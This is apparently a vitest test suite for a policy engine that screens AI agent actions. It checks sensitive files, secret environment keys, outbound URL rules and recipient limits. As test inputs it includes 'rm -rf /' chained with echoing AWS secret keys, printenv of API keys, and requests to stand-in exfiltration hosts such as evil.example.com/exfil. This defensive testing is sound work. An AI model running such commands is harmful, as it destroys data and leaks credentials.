import { mkdtemp, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import { describe, expect, it, vi } from 'vitest';

import {
  CODING_AGENT_PRESET,
  FilePolicyProvider,
  StaticPolicyProvider,
  evaluateOutboundRules,
  evaluateRecipientThreshold,
  evaluateSensitiveEnvKeys,
  evaluateSensitiveFiles,
  evaluateStaticPolicy,
  validatePolicyRules,
  type ActionEnvelope,
  type PolicyConfig
} from '@moshesdk/core';
import { ReasonCode } from '@moshesdk/spec';

import { loadFixture } from '../../../test/fixtures.js';

function actionWith(overrides: Partial<ActionEnvelope>): ActionEnvelope {
  return {
    actionId: 'policy-inline',
    sessionId: 'policy-session',
    timestamp: '2026-04-01T00:00:00.000Z',
    framework: 'generic',
    actionType: 'unknown',
    operation: 'noop',
    toolName: 'noop',
    arguments: {},
    ...overrides
  };
}

function ctx(policy: PolicyConfig) {
  return {
    sessionId: 'policy-session',
    policy,
    sessionStore: {
      getSession: async () => null,
      putSession: async () => undefined,
      getApprovalReplay: async () => null,
      putApprovalReplay: async () => undefined
    },
    artifactStore: {
      getArtifact: async () => null,
      putArtifact: async () => undefined,
      listArtifacts: async () => []
    },
    startedAt: 0
  };
}

async function tempPolicyPath(fileName: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'moshe-policy-'));
  return join(dir, fileName);
}

describe('policy evaluators', () => {
  it('evaluateSensitiveFiles reviews direct sensitive file access', async () => {
    const envelope = await loadFixture<ActionEnvelope>('actions/review-sensitive-file.json');
    const result = evaluateSensitiveFiles(envelope, {
      version: '0.1.0',
      sensitiveFiles: ['.env']
    });

    expect(result?.decision).toBe('REVIEW');
    expect(result?.reasonCodes).toEqual([ReasonCode.SENSITIVE_FILE_ACCESS]);
    expect(result?.enrichments?.severity).toBe('medium');
  });

  it('evaluateSensitiveFiles matches basename case-insensitively', () => {
    const result = evaluateSensitiveFiles(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: { path: '~/.ssh/ID_RSA' }
      }),
      {
        version: '0.1.0',
        sensitiveFiles: ['id_rsa']
      }
    );

    expect(result?.decision).toBe('REVIEW');
  });

  it('evaluateSensitiveFiles does not match a different basename', () => {
    const result = evaluateSensitiveFiles(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: { path: '.envrc' }
      }),
      {
        version: '0.1.0',
        sensitiveFiles: ['.env']
      }
    );

    expect(result).toBeNull();
  });

  it('evaluateSensitiveFiles returns null for empty config and matches referencedPaths', () => {
    const none = evaluateSensitiveFiles(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: {},
        referencedPaths: ['nested/.env']
      }),
      {
        version: '0.1.0',
        sensitiveFiles: []
      }
    );
    expect(none).toBeNull();

    const matched = evaluateSensitiveFiles(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: {},
        referencedPaths: ['nested/.env']
      }),
      {
        version: '0.1.0',
        sensitiveFiles: ['.env']
      }
    );
    expect(matched?.decision).toBe('REVIEW');
  });

  it('evaluateSensitiveEnvKeys detects unix, windows, and printenv patterns', async () => {
    const unixEnvelope = await loadFixture<ActionEnvelope>('actions/review-sensitive-env.json');
    expect(
      evaluateSensitiveEnvKeys(unixEnvelope, {
        version: '0.1.0',
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      })?.reasonCodes
    ).toEqual([ReasonCode.SENSITIVE_ENV_ACCESS]);

    const windows = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'command_exec',
        operation: 'exec',
        toolName: 'cmd',
        arguments: { shell: 'echo %GITHUB_TOKEN%' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['GITHUB_TOKEN']
      }
    );
    expect(windows?.decision).toBe('REVIEW');

    const printenv = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'command_exec',
        operation: 'exec',
        toolName: 'bash',
        arguments: { command: 'printenv OPENAI_API_KEY' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['OPENAI_API_KEY']
      }
    );
    expect(printenv?.decision).toBe('REVIEW');
  });

  it('evaluateSensitiveEnvKeys returns null for unrelated or missing commands', () => {
    const unrelated = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'command_exec',
        operation: 'exec',
        toolName: 'bash',
        arguments: { command: 'echo $UNRELATED_VAR' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      }
    );
    expect(unrelated).toBeNull();

    const missing = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: { path: '.env' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      }
    );
    expect(missing).toBeNull();
  });

  it('evaluateSensitiveEnvKeys scans content and body text fields', () => {
    const contentMatch = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'file_write',
        operation: 'write',
        toolName: 'write_file',
        arguments: { content: 'Value is $AWS_SECRET_ACCESS_KEY' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      }
    );
    expect(contentMatch?.decision).toBe('REVIEW');

    const bodyMatch = evaluateSensitiveEnvKeys(
      actionWith({
        actionType: 'message_send',
        operation: 'send',
        toolName: 'send_email',
        arguments: { body: 'Value is $AWS_SECRET_ACCESS_KEY' }
      }),
      {
        version: '0.1.0',
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      }
    );
    expect(bodyMatch?.decision).toBe('REVIEW');
  });

  it('evaluateForbiddenFile matches case-insensitively', async () => {
    const upper = await evaluateStaticPolicy(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: { path: '.ENV' }
      }),
      ctx({ version: '0.1.0', forbiddenFiles: ['.env'] })
    );
    expect(upper.decision).toBe('BLOCK');

    const mixed = await evaluateStaticPolicy(
      actionWith({
        actionType: 'file_read',
        operation: 'read',
        toolName: 'read_file',
        arguments: { path: '.Env' }
      }),
      ctx({ version: '0.1.0', forbiddenFiles: ['.env'] })
    );
    expect(mixed.decision).toBe('BLOCK');
  });

  it('evaluateOutboundRules blocks, allows, and ignores unmatched URLs', async () => {
    const blockedEnvelope = await loadFixture<ActionEnvelope>('actions/block-outbound-rule.json');
    const blocked = evaluateOutboundRules(blockedEnvelope, {
      version: '0.1.0',
      outboundRules: [{ pattern: 'evil.example.com', action: 'block' }]
    });
    expect(blocked?.reasonCodes).toEqual([ReasonCode.OUTBOUND_BLOCKED]);

    const allowed = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: { url: 'https://api.trusted.com/data' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'api.trusted.com', action: 'allow' }]
      }
    );
    expect(allowed).toBeNull();

    const unmatched = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: { url: 'https://safe.example.com/path' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'evil.example.com', action: 'block' }]
      }
    );
    expect(unmatched).toBeNull();
  });

  it('evaluateOutboundRules honors rule order and outboundTargets sources', () => {
    const ordered = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: { url: 'https://evil.example.com/exfil' }
      }),
      {
        version: '0.1.0',
        outboundRules: [
          { pattern: 'evil.example.com', action: 'block' },
          { pattern: 'evil.example.com', action: 'allow' }
        ]
      }
    );
    expect(ordered?.decision).toBe('BLOCK');

    const outboundTargets = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: {},
        outboundTargets: ['https://evil.example.com/upload']
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'evil.example.com', action: 'block' }]
      }
    );
    expect(outboundTargets?.decision).toBe('BLOCK');
  });

  it('evaluateOutboundRules - domain normalization', () => {
    const blocksSubdomain = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: { url: 'https://api.evil.com/steal' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'evil.com', action: 'block' }]
      }
    );
    expect(blocksSubdomain?.decision).toBe('BLOCK');

    const noSuffixFalsePositive = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: { url: 'https://notexample.com/path' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'example.com', action: 'block' }]
      }
    );
    expect(noSuffixFalsePositive).toBeNull();

    const parentAllowCoversSubdomain = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'get',
        toolName: 'http_request',
        arguments: { url: 'https://api.github.com/repos' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'github.com', action: 'allow' }]
      }
    );
    expect(parentAllowCoversSubdomain).toBeNull();

    const pathSpecificMatch = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'get',
        toolName: 'http_request',
        arguments: { url: 'https://example.com/internal/secrets' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'example.com/internal', action: 'block' }]
      }
    );
    expect(pathSpecificMatch?.decision).toBe('BLOCK');

    const pathSpecificMismatch = evaluateOutboundRules(
      actionWith({
        actionType: 'outbound_request',
        operation: 'get',
        toolName: 'http_request',
        arguments: { url: 'https://example.com/public/docs' }
      }),
      {
        version: '0.1.0',
        outboundRules: [{ pattern: 'example.com/internal', action: 'block' }]
      }
    );
    expect(pathSpecificMismatch).toBeNull();
  });

  it('evaluateRecipientThreshold blocks or reviews only when count is strictly greater', async () => {
    const envelope = await loadFixture<ActionEnvelope>('actions/block-recipient-threshold.json');

    const blocked = evaluateRecipientThreshold(envelope, {
      version: '0.1.0',
      recipientThreshold: { maxRecipients: 3, action: 'block' }
    });
    expect(blocked?.reasonCodes).toEqual([ReasonCode.RECIPIENT_THRESHOLD_EXCEEDED]);
    expect(blocked?.decision).toBe('BLOCK');

    const reviewed = evaluateRecipientThreshold(envelope, {
      version: '0.1.0',
      recipientThreshold: { maxRecipients: 3, action: 'review' }
    });
    expect(reviewed?.decision).toBe('REVIEW');

    const equal = evaluateRecipientThreshold(
      actionWith({
        actionType: 'message_send',
        operation: 'send',
        toolName: 'send_email',
        arguments: { recipients: ['a@x.com', 'b@x.com', 'c@x.com'] }
      }),
      {
        version: '0.1.0',
        recipientThreshold: { maxRecipients: 3, action: 'block' }
      }
    );
    expect(equal).toBeNull();

    expect(evaluateRecipientThreshold(actionWith({ arguments: {} }), { version: '0.1.0' })).toBeNull();
    expect(evaluateRecipientThreshold(envelope, { version: '0.1.0' })).toBeNull();
  });

  it('evaluateStaticPolicy returns first block over earlier reviews and merges multiple reviews otherwise', async () => {
    const reviewThenBlock = await evaluateStaticPolicy(
      actionWith({
        actionType: 'command_exec',
        operation: 'exec',
        toolName: 'bash',
        arguments: {
          command: 'rm -rf / && echo $AWS_SECRET_ACCESS_KEY',
          path: '.env'
        }
      }),
      ctx({
        version: '0.1.0',
        forbiddenCommands: ['rm\\s+-rf\\s+/'],
        sensitiveFiles: ['.env'],
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      })
    );
    expect(reviewThenBlock.decision).toBe('BLOCK');
    expect(reviewThenBlock.reasonCodes).toContain(ReasonCode.FORBIDDEN_COMMAND);

    const mergedReview = await evaluateStaticPolicy(
      actionWith({
        actionType: 'command_exec',
        operation: 'exec',
        toolName: 'bash',
        arguments: {
          command: 'echo $AWS_SECRET_ACCESS_KEY',
          path: '.env'
        }
      }),
      ctx({
        version: '0.1.0',
        sensitiveFiles: ['.env'],
        sensitiveEnvKeys: ['AWS_SECRET_ACCESS_KEY']
      })
    );
    expect(mergedReview.decision).toBe('REVIEW');
    expect(mergedReview.reasonCodes).toContain(ReasonCode.SENSITIVE_FILE_ACCESS);
    expect(mergedReview.reasonCodes).toContain(ReasonCode.SENSITIVE_ENV_ACCESS);
    expect(mergedReview.enrichments?.severity).toBe('medium');

    const allow = await evaluateStaticPolicy(
      await loadFixture<ActionEnvelope>('actions/allow-simple-command.json'),
      ctx({ version: '0.1.0' })
    );
    expect(allow.decision).toBe('ALLOW');
    expect(allow.reasonCodes).toEqual([ReasonCode.NO_POLICY_MATCH]);
  });

  it('evaluateStaticPolicy does not skip later evaluators after an early review', async () => {
    const result = await evaluateStaticPolicy(
      actionWith({
        actionType: 'outbound_request',
        operation: 'post',
        toolName: 'http_request',
        arguments: {
          url: 'https://evil.example.com/exfil',
          path: '.env'
        }
      }),
      ctx({
        version: '0.1.0',
        sensitiveFiles: ['.env'],
        outboundRules: [{ pattern: 'evil.example.com', action: 'block' }]
      })
    );

    expect(result.decision).toBe('BLOCK');
    expect(result.reasonCodes).toEqual([ReasonCode.OUTBOUND_BLOCKED]);
  });

  it('validatePolicyRules catches invalid executable rules', () => {
    const invalidRegex = validatePolicyRules({
      version: '0.1.0',
      forbiddenCommands: ['[']
    });
    expect(invalidRegex[0]).toMatchObject({
      field: 'forbiddenCommands',
      index: 0,
      value: '[',
      reason: 'invalid regex'
    });

    const negativeRecipients = validatePolicyRules({
      version: '0.1.0',
      recipientThreshold: { maxRecipients: -1, action: 'block' }
    });
    expect(negativeRecipients[0]?.field).toBe('recipientThreshold.maxRecipients');

    const emptyOutbound = validatePolicyRules({
      version: '0.1.0',
      outboundRules: [{ pattern: '   ', action: 'block' }]
    });
    expect(emptyOutbound[0]?.field).toBe('outboundRules');

    expect(validatePolicyRules({ version: '0.1.0' })).toEqual([]);
  });
});

describe('FilePolicyProvider', () => {
  it('loads a valid policy file', async () => {
    const path = await tempPolicyPath('policy.json');
    await writeFile(path, JSON.stringify(await loadFixture<PolicyConfig>('policies/with-sensitive-and-outbound.json'), null, 2), 'utf8');

    const provider = new FilePolicyProvider(path);
    await expect(provider.getEffective()).resolves.toMatchObject({
      sensitiveFiles: ['.env', 'id_rsa', '.netrc']
    });
  });

  it('throws for missing files and malformed JSON', async () => {
    const missing = new FilePolicyProvider(await tempPolicyPath('missing.json'));
    await expect(missing.getEffective()).rejects.toThrow(/missing\.json/i);

    const malformedPath = await tempPolicyPath('malformed.json');
    await writeFile(malformedPath, '{"version": "0.1.0",', 'utf8');
    const malformed = new FilePolicyProvider(malformedPath);
    await expect(malformed.getEffective()).rejects.toThrow(/malformed\.json/i);
  });

  it('rejects policies with invalid regex before evaluation time', async () => {
    const path = await tempPolicyPath('invalid-policy.json');
    await writeFile(path, JSON.stringify({
      version: '0.1.0',
      forbiddenCommands: ['[']
    }, null, 2), 'utf8');

    const provider = new FilePolicyProvider(path);
    await expect(provider.getEffective()).rejects.toThrow(/invalid regex/i);
  });

  it('applies presetOverlays and does not warn for a valid preset', async () => {
    const path = await tempPolicyPath('overlay-policy.json');
    await writeFile(path, JSON.stringify({
      version: '0.1.0',
      presetOverlays: ['coding-agent']
    }, null, 2), 'utf8');

    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const provider = new FilePolicyProvider(path);

    await expect(provider.getEffective()).resolves.toMatchObject({
      presetOverlays: ['coding-agent'],
      forbiddenCommands: expect.arrayContaining([CODING_AGENT_PRESET.forbiddenCommands?.[0] ?? ''])
    });
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });

  it('StaticPolicyProvider validates executable rules before evaluation time', async () => {
    const provider = new StaticPolicyProvider({
      version: '0.1.0',
      forbiddenCommands: ['[']
    });

    await expect(provider.validate(await provider.load())).rejects.toThrow(/invalid regex/i);
  });

  it('StaticPolicyProvider applies preset overlays in getEffective()', async () => {
    const provider = new StaticPolicyProvider({
      version: '0.1.0',
      presetOverlays: ['coding-agent']
    });

    await expect(provider.getEffective()).resolves.toMatchObject({
      forbiddenCommands: expect.arrayContaining(CODING_AGENT_PRESET.forbiddenCommands ?? [])
    });
  });
});
